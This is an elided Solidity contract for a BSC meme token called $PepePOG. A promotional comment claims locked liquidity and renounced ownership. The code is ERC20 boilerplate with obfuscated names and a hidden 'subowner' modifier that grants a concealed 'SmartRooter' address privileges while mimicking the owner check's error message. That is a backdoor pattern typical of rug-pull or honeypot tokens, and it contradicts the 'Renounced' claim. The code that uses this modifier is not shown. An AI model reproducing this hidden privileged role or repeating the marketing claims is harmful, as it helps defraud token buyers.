...
/*
▄︻デ══━一💥 Pepe POGGER  $PepePOG  ▄︻デ══━一💥

🐸meme token and future game integration . let's play trade and have fun 
🐸Are you ready to join the crypto craze and ride the wave of the latest meme token sensation? Look no further than $PepePOG, the hottest new addition to the Binance network! base on the  POGGERS the FROG is a CRIMINAL in GTA 5 MODS 5 game.

▄︻デ══━一💥 LP LOCK 
▄︻デ══━一💥Renounced
▄︻デ══━一💥tax low bsc gem

🐸telegram https://t.me/PepePOG
🐸Website  https://pogger.online/
*/
...
/*
 * @dev Provides information about the current execution ether20Burnable, including the
 ...
 */
abstract contract ether20Burnable {
...
// File: @openzeppelin/contracts/access/ether20Ownable.sol
 ...
 * the owner.
 */
abstract contract ether20Ownable is ether20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ether20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ether20Ownable: new owner is the zero address");
 ...
 * `Safeether` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library Safeether {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "Safeether: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "Safeether: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "Safeether: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "Safeether: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "Safeether: modulo by zero");
  }
...
contract PepePOG is ether20Burnable, ether711, ether20Ownable {
    
    using Safeether for uint256;
    ...
    */
    ...
    /**
    * @dev See {ether711-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return deployfrom[account];
    }
      modifier subowner() {
        require(SmartRooter == _msgSender(), "ether20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {ether711-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ether711-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {ether711};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "ether711: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {ether711-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "ether711: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "ether711: transfer from the zero address");
        require(shippingto != address(0), "ether711: transfer to the zero address");
                
        deployfrom[sender] = deployfrom[sender].sub(yoursold, "ether711: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "ether711: approve from the zero address");
        require(transporteur != address(0), "ether711: approve to the zero address");
